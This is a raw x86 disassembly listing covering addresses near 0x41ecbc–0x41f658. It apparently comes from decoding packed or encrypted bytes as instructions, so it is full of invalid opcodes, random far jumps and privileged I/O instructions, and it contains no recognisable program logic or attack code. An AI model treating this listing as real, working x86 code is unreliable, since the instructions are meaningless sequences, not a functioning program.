  41ecbc:	test   DWORD PTR [edi-0x43],0x75e14bd
  41ecc3:	adc    eax,0x792eb3f8
  41ecc8:	aad    0xd
  41ecca:	gs call 0xe4ff43d0
  41ecd0:	pop    ebx
  41ecd1:	push   esp
  41ecd2:	and    BYTE PTR [ebp+0x20540ca9],ch
  41ecd8:	xor    al,ah
  41ecda:	js     0x41ecac
  41ecdc:	cdq    
  41ecdd:	mov    dh,BYTE PTR [edx-0x5b]
  41ece0:	mov    ds:0xc906d3ea,al
  41ece5:	dec    edx
  41ece6:	ds mov esp,0x16f7eeca
  41ecec:	aam    0x67
  41ecee:	xlat   BYTE PTR ds:[ebx]
  41ecef:	daa    
  41ecf0:	shr    edi,1
  41ecf2:	test   al,0x9
  41ecf4:	pushf  
  41ecf5:	popf   
  41ecf6:	xchg   ebp,eax
  41ecf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf8:	jno    0x41ed11
  41ecfa:	inc    eax
  41ecfb:	ficom  DWORD PTR [edx-0x5c]
  41ecfe:	adc    DWORD PTR [ebx],edi
  41ed00:	inc    edi
  41ed01:	mov    ah,0xa1
  41ed03:	out    dx,al
  41ed04:	jmp    0x7492:0x6da83119
  41ed0b:	jmp    0x13f3:0x2a367121
  41ed12:	(bad)  
  41ed14:	sti    
  41ed15:	retf   0xabc1
  41ed18:	iret   
  41ed19:	adc    esp,DWORD PTR [ebp-0x41]
  41ed1c:	aad    0x2d
  41ed1e:	loop   0x41ed90
  41ed20:	mov    cl,0xe
  41ed22:	aaa    
  41ed23:	pop    ecx
  41ed24:	jns    0x41ed43
  41ed26:	jmp    0x41ed4a
  41ed28:	mov    edi,0xc3dd9276
  41ed2d:	and    BYTE PTR [eax],dh
  41ed2f:	and    BYTE PTR [ebx-0x29231d28],ch
  41ed35:	push   0xffffffd6
  41ed37:	xchg   cx,ax
  41ed39:	cmp    al,0x8b
  41ed3b:	xor    ebp,esp
  41ed3d:	push   es
  41ed3e:	sub    al,0x78
  41ed40:	mov    ecx,0xf2f4ab9f
  41ed45:	adc    eax,0xe7dc58f
  41ed4a:	(bad)  
  41ed4b:	xchg   edx,eax
  41ed4c:	or     DWORD PTR [esi-0x45],edx
  41ed4f:	imul   edi,esp,0x610c6b12
  41ed55:	and    esi,DWORD PTR [esi]
  41ed57:	in     eax,dx
  41ed58:	std    
  41ed59:	pusha  
  41ed5a:	xor    eax,0x7085401b
  41ed5f:	dec    edi
  41ed60:	inc    ebx
  41ed61:	and    eax,0x3acff39d
  41ed66:	dec    edx
  41ed67:	pop    ecx
  41ed68:	iret   
  41ed69:	mov    dl,BYTE PTR [esi+eiz*4-0x7]
  41ed6d:	jge    0x41edee
  41ed6f:	(bad)  
  41ed70:	repnz xchg ebx,eax
  41ed72:	mov    esp,0xc1f9e28
  41ed77:	icebp  
  41ed78:	cld    
  41ed79:	adc    dl,BYTE PTR [esp+ebx*8+0x3a037aae]
  41ed80:	int3   
  41ed81:	or     al,0x74
  41ed83:	mov    esi,0xc975e299
  41ed88:	pop    ebx
  41ed89:	out    0xc2,al
  41ed8b:	mov    bl,0x4b
  41ed8d:	mov    ecx,0x5f70b28b
  41ed92:	jbe    0x41edcd
  41ed94:	dec    edi
  41ed95:	inc    esp
  41ed96:	in     eax,0x43
  41ed98:	lods   al,BYTE PTR ds:[esi]
  41ed99:	icebp  
  41ed9a:	lahf   
  41ed9b:	sti    
  41ed9c:	jns    0x41ed28
  41ed9e:	xor    al,0x96
  41eda0:	fwait
  41eda1:	and    DWORD PTR [edi-0x43],esp
  41eda4:	sar    BYTE PTR [edi],0xd0
  41eda7:	sbb    eax,0xb3ff981a
  41edac:	iret   
  41edad:	js     0x41ed94
  41edaf:	mov    eax,ds:0xb5ef6703
  41edb4:	mov    al,0x0
	...
  41ee16:	add    eax,0x7b197956
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0xb375b0a2,al
  41ee23:	inc    ebx
  41ee24:	imul   edi,DWORD PTR [esi],0x20
  41ee27:	inc    edi
  41ee28:	add    DWORD PTR [eax],eax
  41ee2a:	pop    es
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [edi],ch
  41ee2f:	mov    ds:0x8b3a5d98,eax
  41ee34:	xchg   BYTE PTR [edi],bh
  41ee36:	int    0x4b
  41ee38:	cmp    bl,BYTE PTR [edi+0x239c9028]
  41ee3e:	pop    edx
  41ee3f:	adc    dh,BYTE PTR [ebx-0x9]
  41ee42:	and    eax,0x96287903
  41ee47:	xchg   edx,eax
  41ee48:	push   eax
  41ee49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee4a:	icebp  
  41ee4b:	mov    bl,0xf7
  41ee4d:	sbb    dl,cl
  41ee4f:	xchg   BYTE PTR [edi+0x62],ch
  41ee52:	shr    BYTE PTR [edx+edi*8+0x33659686],1
  41ee59:	cmp    DWORD PTR [esi+0x32],edx
  41ee5c:	iret   
  41ee5d:	inc    esi
  41ee5e:	leave  
  41ee5f:	pop    ss
  41ee60:	or     al,0x85
  41ee62:	xor    eax,esp
  41ee64:	xchg   ecx,eax
  41ee65:	pusha  
  41ee66:	and    DWORD PTR [edx],edi
  41ee68:	in     eax,dx
  41ee69:	mov    al,0x80
  41ee6b:	loopne 0x41eedd
  41ee6d:	test   al,0x2
  41ee6f:	ins    BYTE PTR es:[edi],dx
  41ee70:	jmp    0x30b07fa2
  41ee75:	mov    ebp,DWORD PTR [edi+0x6f]
  41ee78:	stos   DWORD PTR es:[edi],eax
  41ee79:	mov    dh,0x60
  41ee7b:	popf   
  41ee7c:	arpl   WORD PTR [ebx+0x476bf9e4],bx
  41ee82:	sub    al,0xd7
  41ee84:	sbb    DWORD PTR [ebx],edi
  41ee86:	test   al,0x6a
  41ee88:	pop    ds
  41ee89:	shl    DWORD PTR [esi],cl
  41ee8b:	sbb    DWORD PTR [edx],ebx
  41ee8d:	leave  
  41ee8e:	mov    esi,0xb2b1008c
  41ee93:	cmp    DWORD PTR [edi+ecx*4+0x42f59df6],ebp
  41ee9a:	ficom  DWORD PTR [eax-0x6a]
  41ee9d:	es (bad) 
  41ee9f:	cmp    al,0x6c
  41eea1:	add    al,0x36
  41eea3:	sub    eax,0xf36548be
  41eea8:	xchg   ebx,eax
  41eea9:	das    
  41eeaa:	push   ss
  41eeab:	cmp    al,0x6e
  41eead:	or     esp,0x50
  41eeb0:	mov    eax,ds:0xee7f7424
  41eeb5:	call   0xcb121639
  41eeba:	outs   dx,DWORD PTR ds:[esi]
  41eebb:	pop    ds
  41eebc:	push   edx
  41eebd:	adc    bh,BYTE PTR [edi+ecx*8-0x30c82642]
  41eec4:	fwait
  41eec5:	mov    al,0x59
  41eec7:	(bad)  
  41eec8:	jnp    0x41ee6c
  41eeca:	out    0x8,eax
  41eecc:	bnd jge 0x41eeec
  41eecf:	out    dx,eax
  41eed0:	dec    edi
  41eed1:	xchg   ecx,eax
  41eed2:	rcr    BYTE PTR [eax],1
  41eed4:	test   esi,eax
  41eed6:	sbb    DWORD PTR [edi+0x64],ebx
  41eed9:	dec    BYTE PTR [ecx+0x55016863]
  41eedf:	cmp    DWORD PTR [ecx-0x61cbf269],esi
  41eee5:	fs sub eax,0xfd6f9dce
  41eeeb:	sbb    BYTE PTR [eax-0x40120f28],ah
  41eef1:	adc    BYTE PTR ds:0xfd3b12c5,bh
  41eef7:	jp     0x41ef2c
  41eef9:	lds    edi,FWORD PTR [edx]
  41eefb:	rcl    edx,cl
  41eefd:	adc    eax,DWORD PTR [ecx-0x47]
  41ef00:	out    0x37,eax
  41ef02:	sbb    BYTE PTR [esi],al
  41ef04:	ret    
  41ef05:	push   ecx
  41ef06:	and    al,0xcb
  41ef08:	popf   
  41ef09:	ss sti 
  41ef0b:	xor    bl,ah
  41ef0d:	or     al,0xc2
  41ef0f:	fs gs scas al,BYTE PTR es:[edi]
  41ef12:	dec    esp
  41ef13:	aaa    
  41ef14:	jle    0x41eeb5
  41ef16:	pop    ebx
  41ef17:	ret    
  41ef18:	dec    DWORD PTR [edx+0x38072b8c]
  41ef1e:	and    bh,dl
  41ef20:	inc    ebx
  41ef21:	test   al,0xd2
  41ef23:	cmp    BYTE PTR [ebx-0x7a],cl
  41ef26:	cmp    al,0x32
  41ef28:	or     BYTE PTR [ecx],cl
  41ef2a:	outs   dx,BYTE PTR ds:[esi]
  41ef2b:	mov    cl,BYTE PTR [ebp+0x1a7befac]
  41ef31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef32:	iret   
  41ef33:	jb     0x41ef8f
	...
  41ef95:	add    BYTE PTR [ecx-0xda40a3],bh
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax-0x780314c8]
  41efa3:	data16 in al,0x5f
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [esi],dh
  41efaf:	dec    ebp
  41efb0:	cmc    
  41efb1:	fst    DWORD PTR [edi+ebp*1]
  41efb4:	in     eax,0x10
  41efb6:	dec    esi
  41efb7:	and    esi,ebp
  41efb9:	sbb    eax,0x6608f047
  41efbe:	adc    ch,cl
  41efc0:	fsub   st,st(0)
  41efc2:	enter  0x2af5,0x53
  41efc6:	sti    
  41efc7:	xor    BYTE PTR [esi+edi*1],dh
  41efca:	in     eax,0x42
  41efcc:	scas   al,BYTE PTR es:[edi]
  41efcd:	xchg   BYTE PTR [ebx],ch
  41efcf:	mov    ch,0x91
  41efd1:	push   eax
  41efd2:	mov    ebp,0x6c6c5017
  41efd7:	es scas eax,DWORD PTR es:[edi]
  41efd9:	inc    edi
  41efda:	dec    ebp
  41efdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efdc:	sbb    BYTE PTR [edi],0x50
  41efdf:	aam    0xdd
  41efe1:	les    ecx,FWORD PTR [edi+ecx*4]
  41efe4:	popf   
  41efe5:	xchg   ecx,eax
  41efe6:	mov    al,0xb5
  41efe8:	fcomp  st(0)
  41efea:	fisttp QWORD PTR [eax-0x6028de1e]
  41eff0:	xchg   ecx,eax
  41eff1:	jno    0x41efbb
  41eff3:	xchg   DWORD PTR [edi-0x66372b24],eax
  41eff9:	sub    al,0x9b
  41effb:	repz or ebx,ebx
  41effe:	cmc    
  41efff:	ins    DWORD PTR es:[edi],dx
  41f000:	ror    eax,0x51
  41f003:	or     ebx,DWORD PTR [esi+0x1]
  41f006:	push   ebx
  41f007:	sub    eax,DWORD PTR [eax-0xf]
  41f00a:	xchg   edi,eax
  41f00b:	leave  
  41f00c:	mov    edx,0x2e1e046c
  41f011:	repz sub ecx,ebp
  41f014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f015:	iret   
  41f016:	and    BYTE PTR [edx],cl
  41f018:	sub    esp,DWORD PTR ds:0x92a5eb1c
  41f01e:	outs   dx,BYTE PTR ds:[esi]
  41f01f:	in     al,0xe
  41f021:	scas   eax,DWORD PTR es:[edi]
  41f022:	aad    0x42
  41f024:	jmp    FWORD PTR [edi+0x6a]
  41f027:	sti    
  41f028:	lods   eax,DWORD PTR ds:[esi]
  41f029:	pop    ecx
  41f02a:	leave  
  41f02b:	lock add al,0xc8
  41f02e:	dec    ebx
  41f02f:	mov    ch,0x3a
  41f031:	loopne 0x41f09a
  41f033:	daa    
  41f034:	ret    0x4ae2
  41f037:	mov    edx,0xa73c5faf
  41f03c:	jnp    0x41f02b
  41f03e:	shl    DWORD PTR [ebx-0x75],cl
  41f041:	push   cs
  41f042:	inc    edi
  41f043:	xor    dh,BYTE PTR [esi-0x32574f9b]
  41f049:	int3   
  41f04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f04b:	push   esi
  41f04c:	fisttp WORD PTR [edx+edi*2]
  41f04f:	add    BYTE PTR [ebx+0x4c],bh
  41f052:	mov    esp,0xa1b37843
  41f057:	mov    eax,0x96ab93dc
  41f05c:	call   0x93918e78
  41f061:	jne    0x41f081
  41f063:	test   al,0xd3
  41f065:	xlat   BYTE PTR ds:[ebx]
  41f066:	sahf   
  41f067:	arpl   WORD PTR [esp+ebp*2],cx
  41f06a:	int3   
  41f06b:	sbb    al,0x7b
  41f06d:	or     ch,dl
  41f06f:	pushf  
  41f070:	ror    DWORD PTR [ecx+0x65],0xf5
  41f074:	jmp    0x26461da0
  41f079:	adc    eax,0x2725cd25
  41f07e:	xchg   DWORD PTR [edx],eax
  41f080:	and    al,0xd5
  41f082:	mov    dl,0x21
  41f084:	xchg   al,cl
  41f086:	mov    dh,BYTE PTR [ebx+0x72]
  41f089:	jb     0x41f0fd
  41f08b:	mov    dh,0x60
  41f08d:	and    BYTE PTR [eax+0x403ad447],0x22
  41f094:	je     0x41f0d3
  41f096:	sti    
  41f097:	pop    ecx
  41f098:	fmul   DWORD PTR [esi+eiz*1-0x5f]
  41f09c:	adc    al,0xae
  41f09e:	jmp    0x7159:0xc1f0e756
  41f0a5:	and    BYTE PTR [eax+0x4f4ed41f],ch
  41f0ab:	mov    ds:0x3ae07beb,eax
  41f0b0:	je     0x41f0b3
  41f0b2:	loope  0x41f05b
  41f0b4:	pop    ds
	...
  41f115:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx+0x77557968]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    al,ch
  41f12f:	out    0x92,eax
  41f131:	mul    BYTE PTR [edx+0x52069c31]
  41f137:	ins    BYTE PTR es:[edi],dx
  41f138:	push   ebx
  41f139:	call   0x78280394
  41f13e:	popa   
  41f13f:	test   ch,ah
  41f141:	repnz test BYTE PTR [eax-0x62],bl
  41f145:	aaa    
  41f146:	and    DWORD PTR [ecx-0x5ac2d923],edx
  41f14c:	mov    WORD PTR [bx],ss
  41f14f:	or     al,0x34
  41f151:	(bad)  
  41f152:	cmp    al,0xf7
  41f154:	in     al,0x9c
  41f156:	sub    DWORD PTR [ebx+0xb],edx
  41f159:	dec    ebp
  41f15a:	cdq    
  41f15b:	rcl    BYTE PTR [eax+0x7d],1
  41f15e:	jmp    0xb780:0xaddc0717
  41f165:	mov    esp,esp
  41f167:	push   edi
  41f168:	sbb    al,cl
  41f16a:	cmp    dl,0x4a
  41f16d:	inc    ecx
  41f16e:	and    eax,0x4f31a8f6
  41f173:	mov    ebx,0x5b438920
  41f178:	inc    ecx
  41f179:	pop    ecx
  41f17a:	iret   
  41f17b:	je     0x41f1cd
  41f17d:	outs   dx,DWORD PTR ds:[esi]
  41f17e:	push   edx
  41f17f:	inc    ebp
  41f180:	stos   BYTE PTR es:[edi],al
  41f181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f182:	icebp  
  41f183:	sbb    dl,BYTE PTR [edi+edx*2+0x4db91b5]
  41f18a:	repz ja 0x41f1ab
  41f18d:	dec    esp
  41f18e:	ret    0x49ae
  41f191:	test   BYTE PTR [ebx],dh
  41f193:	xchg   ecx,eax
  41f194:	mov    ah,cl
  41f196:	clc    
  41f197:	loope  0x41f1c3
  41f199:	mov    eax,ds:0x9ad4caa1
  41f19e:	punpckldq mm1,mm4
  41f1a1:	scas   eax,DWORD PTR es:[edi]
  41f1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1a3:	adc    eax,0xc3db8b52
  41f1a8:	je     0x41f153
  41f1aa:	mov    bh,0xfc
  41f1ac:	adc    al,0xe6
  41f1ae:	test   BYTE PTR [ebp+0x58],bh
  41f1b1:	inc    ebp
  41f1b2:	jmp    0xe8d0:0xad4d03bf
  41f1b9:	mov    ah,0xae
  41f1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1bd:	scas   al,BYTE PTR es:[edi]
  41f1be:	push   0xffffff87
  41f1c0:	jne    0x41f1b6
  41f1c2:	mov    ch,0x96
  41f1c4:	mov    edi,?
  41f1c6:	lds    ebp,FWORD PTR [ebp+0x6f]
  41f1c9:	push   0x4cf8e602
  41f1ce:	test   eax,0x1fd88d82
  41f1d3:	pop    eax
  41f1d4:	adc    DWORD PTR ds:0x704b9f45,ecx
  41f1da:	repz mov WORD PTR ds:0x955699fb,fs
  41f1e1:	sub    DWORD PTR [edx+edx*4],0x3a
  41f1e5:	(bad)  
  41f1e6:	sbb    eax,0xcd85cd4a
  41f1eb:	dec    ebp
  41f1ec:	mov    eax,ds:0x9b6374f8
  41f1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f2:	stos   BYTE PTR es:[edi],al
  41f1f3:	mov    esi,0xf987867e
  41f1f8:	dec    edi
  41f1f9:	dec    ecx
  41f1fa:	mov    ah,0x12
  41f1fc:	sub    al,0x5c
  41f1fe:	add    BYTE PTR [edx],bl
  41f200:	jecxz  0x41f197
  41f202:	mov    ebp,ecx
  41f204:	je     0x41f220
  41f206:	xor    al,0xf6
  41f208:	(bad)  
  41f209:	sahf   
  41f20a:	pop    ebp
  41f20b:	inc    edi
  41f20c:	frstor [eax+eiz*1+0x4f65dd17]
  41f213:	and    dl,dl
  41f215:	adc    eax,0x26b6eaa0
  41f21a:	scas   eax,DWORD PTR es:[edi]
  41f21b:	inc    ebp
  41f21c:	ror    BYTE PTR [edx+0x5f],0x73
  41f220:	and    ah,BYTE PTR [edx+0x75]
  41f223:	and    BYTE PTR [ebx-0x48498cd7],0x41
  41f22a:	rcl    DWORD PTR [eax+0x10],0xab
  41f22e:	inc    ecx
  41f22f:	loope  0x41f1c7
  41f231:	mov    ds:0xc85428,al
	...
  41f296:	push   ecx
  41f297:	sbb    edi,edi
  41f299:	jmp    si
  41f29c:	fnstcw WORD PTR [edi]
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	cmp    eax,0x35374c60
  41f2a7:	dec    edx
  41f2a8:	add    DWORD PTR [eax],eax
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [edx-0x130249bd],cl
  41f2b3:	lock add DWORD PTR [ebp-0x22b3a7f7],ebp
  41f2ba:	cli    
  41f2bb:	pop    ebx
  41f2bc:	push   esi
  41f2bd:	push   0xffffff8d
  41f2bf:	(bad)  
  41f2c0:	cmp    ebx,ebx
  41f2c2:	inc    esp
  41f2c3:	sub    BYTE PTR [ecx],cl
  41f2c5:	jle    0x41f2da
  41f2c7:	(bad)  
  41f2c8:	jae    0x41f313
  41f2ca:	test   eax,0xff6c6045
  41f2cf:	iret   
  41f2d0:	mov    ch,0x85
  41f2d2:	mov    ebp,0xa6d242a6
  41f2d7:	pop    edi
  41f2d8:	idiv   BYTE PTR [ebx-0x2d]
  41f2db:	jnp    0x41f276
  41f2dd:	inc    edx
  41f2de:	sub    eax,0xfa73e982
  41f2e3:	mov    ebx,0x54f9d6c7
  41f2e8:	jbe    0x41f2e4
  41f2ea:	inc    ebx
  41f2eb:	mov    edx,DWORD PTR [eax]
  41f2ed:	int3   
  41f2ee:	mov    ds:0xbf43b06b,eax
  41f2f3:	pop    edi
  41f2f4:	mov    eax,0x6b973228
  41f2f9:	ficom  DWORD PTR [ebp+0x7623a6a9]
  41f2ff:	and    DWORD PTR [esi-0x52],esi
  41f302:	sbb    BYTE PTR [ecx-0x17],cl
  41f305:	cmp    cl,ch
  41f307:	aad    0x40
  41f309:	mov    bl,0xf8
  41f30b:	mov    al,0x50
  41f30d:	ds in  eax,0x6c
  41f310:	stc    
  41f311:	dec    ecx
  41f312:	call   0xf65daad8
  41f317:	inc    edi
  41f318:	sbb    BYTE PTR [ecx],al
  41f31a:	pop    sp
  41f31c:	or     edx,edi
  41f31e:	jge    0x41f2f1
  41f320:	xchg   DWORD PTR [ebx-0x31bd16c2],ebp
  41f326:	push   edi
  41f327:	push   ss
  41f328:	jle    0x41f3a3
  41f32a:	jae    0x41f36a
  41f32c:	addr16 pop ebx
  41f32e:	ins    DWORD PTR es:[edi],dx
  41f32f:	mov    edi,0x9faa0b1d
  41f334:	cld    
  41f335:	sub    eax,0x3fa40c50
  41f33a:	push   ebx
  41f33b:	pop    edx
  41f33c:	push   0xa1c00690
  41f341:	adc    al,0x4c
  41f343:	push   edx
  41f344:	retf   0x98b2
  41f347:	sbb    BYTE PTR [ecx+0x58d5db53],ah
  41f34d:	js     0x41f3bc
  41f34f:	in     eax,0xcc
  41f351:	xor    BYTE PTR [edx],bh
  41f353:	or     al,0x52
  41f355:	adc    edi,edx
  41f357:	jb     0x41f381
  41f359:	push   es
  41f35a:	imul   edx,DWORD PTR [ebx+0x1ae2044f],0x23cfc98c
  41f364:	mov    ds:0x82c971c8,al
  41f369:	test   DWORD PTR cs:[edx+0x9],esp
  41f36d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f36e:	icebp  
  41f36f:	popf   
  41f370:	arpl   WORD PTR [edx],dx
  41f372:	jnp    0x41f350
  41f374:	add    esp,ebx
  41f376:	call   0xb52f:0x2a4d6fd2
  41f37d:	sub    ecx,DWORD PTR [eax+0x4d14ac58]
  41f383:	(bad)  
  41f384:	retf   0x3079
  41f387:	ins    BYTE PTR es:[edi],dx
  41f388:	ret    
  41f389:	scas   eax,DWORD PTR es:[edi]
  41f38a:	(bad)
  41f38d:	sbb    al,0x9e
  41f38f:	stos   DWORD PTR es:[edi],eax
  41f390:	retf   0x3f0d
  41f393:	push   cs
  41f394:	mov    bl,0xa8
  41f396:	mov    eax,ds:0xcdd2f5bd
  41f39b:	aam    0xb2
  41f39d:	push   esi
  41f39e:	jmp    0x41f417
  41f3a0:	ret    0xea89
  41f3a3:	jecxz  0x41f395
  41f3a5:	xor    al,ch
  41f3a7:	pop    es
  41f3a8:	pop    edx
  41f3a9:	mov    dh,0x7e
  41f3ab:	adc    esp,0x3c
  41f3ae:	add    al,ch
  41f3b0:	sub    eax,0x61e6cb00
	...
  41f415:	add    BYTE PTR [edi+eiz*8],bh
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	sbb    DWORD PTR [eax],eax
  41f424:	ret    0x3c19
  41f427:	dec    ebx
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [edi-0x30],ah
  41f430:	mov    ah,0xa
  41f432:	es icebp 
  41f434:	xchg   edx,eax
  41f435:	adc    esi,DWORD PTR [ebx-0x48]
  41f438:	es push ss
  41f43a:	call   0x141e:0xd0ce62ae
  41f441:	xor    ebp,DWORD PTR [edx]
  41f443:	pop    es
  41f444:	mov    eax,ds:0x2403960e
  41f449:	add    BYTE PTR [ecx-0x7],dl
  41f44c:	xchg   edx,eax
  41f44d:	xor    BYTE PTR [edx+eax*1],dh
  41f450:	sahf   
  41f451:	and    eax,0x198fa872
  41f456:	ds push eax
  41f458:	mov    dl,0xa6
  41f45a:	aad    0x34
  41f45c:	mov    ebp,0x28649030
  41f461:	sar    DWORD PTR [esp+ebx*4-0x66],cl
  41f465:	in     al,dx
  41f466:	icebp  
  41f467:	call   0x2b73be8b
  41f46c:	sysexit 
  41f46e:	adc    bh,ch
  41f470:	inc    ebx
  41f471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f472:	nop
  41f473:	push   ebx
  41f474:	ins    DWORD PTR es:[edi],dx
  41f475:	xchg   ebx,eax
  41f476:	mov    ah,0xb3
  41f478:	call   0xe94f:0xe349410f
  41f47f:	pop    edi
  41f480:	es mov eax,0x5a31c6b
  41f486:	jne    0x41f4e0
  41f488:	xlat   BYTE PTR ds:[ebx]
  41f489:	xor    al,0xcf
  41f48b:	shr    DWORD PTR [edx],0xfb
  41f48e:	push   esp
  41f48f:	popa   
  41f490:	arpl   WORD PTR [eax+esi*8-0x7722e968],ax
  41f497:	jmp    0x41f453
  41f499:	test   al,0x11
  41f49b:	push   eax
  41f49c:	loop   0x41f450
  41f49e:	je     0x41f4c0
  41f4a0:	lods   al,BYTE PTR ds:[esi]
  41f4a1:	dec    edi
  41f4a2:	mov    bl,0x42
  41f4a4:	sbb    bl,bh
  41f4a6:	jp     0x41f4aa
  41f4a8:	out    dx,al
  41f4a9:	add    al,0xfe
  41f4ab:	aam    0xc3
  41f4ad:	les    esp,FWORD PTR [ebp+edi*8+0x425a64ae]
  41f4b4:	inc    edx
  41f4b5:	nop
  41f4b6:	push   esi
  41f4b7:	clc    
  41f4b8:	ret    0x717a
  41f4bb:	inc    DWORD PTR ds:0x9005db43
  41f4c1:	add    al,0x2e
  41f4c3:	jo     0x41f503
  41f4c5:	loopne 0x41f4f6
  41f4c7:	cmp    DWORD PTR [edi+0x65d01939],esp
  41f4cd:	sbb    al,BYTE PTR [ecx]
  41f4cf:	stos   BYTE PTR es:[edi],al
  41f4d0:	into   
  41f4d1:	lahf   
  41f4d2:	in     al,0x38
  41f4d4:	mov    cl,cl
  41f4d6:	xchg   edx,eax
  41f4d7:	xchg   ebp,eax
  41f4d8:	jne    0x41f526
  41f4da:	aad    0xf6
  41f4dc:	jo     0x41f528
  41f4de:	mov    ds:0x9d49a2dc,al
  41f4e3:	jmp    0x6c1d442b
  41f4e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e9:	adc    esi,DWORD PTR [ecx+edi*2+0x2f537e92]
  41f4f0:	add    edi,DWORD PTR [esi+0x4c9793db]
  41f4f6:	fimul  DWORD PTR [edx+edi*1]
  41f4f9:	call   0x3c65:0x790067dc
  41f500:	ins    DWORD PTR es:[edi],dx
  41f501:	enter  0x1f88,0x15
  41f505:	xor    BYTE PTR [eax*8-0x6ee0f73f],ah
  41f50c:	mov    ebx,0x496d5836
  41f511:	xor    cl,dh
  41f513:	mov    al,ds:0xb5857f2c
  41f518:	hlt    
  41f519:	xchg   ebp,eax
  41f51a:	stos   DWORD PTR es:[edi],eax
  41f51b:	es jae 0x41f4f7
  41f51e:	popa   
  41f51f:	out    0x40,eax
  41f521:	ret    
  41f522:	es or  al,0x1e
  41f525:	dec    DWORD PTR [ebx-0xd]
  41f528:	fimul  WORD PTR [esi+0x48fe5d47]
  41f52e:	ficom  DWORD PTR [ebp+0x37]
  41f531:	fcomp  QWORD PTR [eax]
  41f533:	mov    eax,ds:0x0
	...
  41f594:	add    BYTE PTR [eax],al
  41f596:	js     0x41f5cc
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	fdiv   DWORD PTR [ebp-0x5f]
  41f5a5:	int    0x43
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [ecx+0x44d33f42],al
  41f5b3:	fnstsw WORD PTR [eax]
  41f5b5:	jge    0x41f5c7
  41f5b7:	add    edi,edi
  41f5b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5ba:	or     DWORD PTR [ebp-0x191b4d01],ecx
  41f5c0:	mov    eax,ds:0x3b78f876
  41f5c5:	out    0x58,al
  41f5c7:	imul   eax,DWORD PTR [ebx-0x41e1f811],0x20457da2
  41f5d1:	ins    BYTE PTR es:[edi],dx
  41f5d2:	adc    bl,BYTE PTR [edi+edx*1+0x1d290b9]
  41f5d9:	push   ebx
  41f5da:	mov    WORD PTR [edi],gs
  41f5dc:	dec    esp
  41f5dd:	push   eax
  41f5de:	dec    esp
  41f5df:	pop    esi
  41f5e0:	pop    edi
  41f5e1:	inc    edx
  41f5e2:	mov    dh,0x5c
  41f5e4:	jmp    0xd2b5:0x8413e7fb
  41f5eb:	popa   
  41f5ec:	and    al,0x46
  41f5ee:	or     BYTE PTR [ebx-0x4f],0xf0
  41f5f2:	mov    esi,0xa8dd44d
  41f5f7:	xchg   ebx,eax
  41f5f8:	adc    BYTE PTR [ebx+eax*2+0x17dc5318],bh
  41f5ff:	out    0x39,eax
  41f601:	jns    0x41f624
  41f603:	les    edi,FWORD PTR [ebp-0x3a]
  41f606:	rcr    esi,cl
  41f608:	fisubr WORD PTR [eax]
  41f60a:	mov    edx,0xf4cc0484
  41f60f:	or     BYTE PTR [edi+0x71],bh
  41f612:	xchg   ebp,eax
  41f613:	fdiv   DWORD PTR [ecx]
  41f615:	fidiv  WORD PTR [eax]
  41f617:	adc    edx,eax
  41f619:	xchg   edx,eax
  41f61a:	out    dx,eax
  41f61b:	fisttp QWORD PTR [esi+0x509867fc]
  41f621:	test   al,0xec
  41f623:	push   0x59
  41f625:	pop    edx
  41f626:	and    al,0x46
  41f628:	pop    ss
  41f629:	or     BYTE PTR [ebp+0xf],ch
  41f62c:	mov    bh,0x45
  41f62e:	mov    dh,BYTE PTR ds:0x8b4f1de5
  41f634:	loopne 0x41f67f
  41f636:	in     al,0x1f
  41f638:	(bad)  
  41f639:	es xchg ebx,eax
  41f63b:	xchg   ebp,esi
  41f63d:	xchg   ecx,eax
  41f63e:	int    0x59
  41f640:	pop    ss
  41f641:	mov    esi,0xa7ef27d7
  41f646:	loopne 0x41f6c4
  41f648:	sub    al,0x2
  41f64a:	ror    DWORD PTR [ebp+0x6a42d6],0x28
  41f651:	or     eax,0x386d40fb
  41f656:	shr    cl,cl
  41f658:	xchg   edx,eax
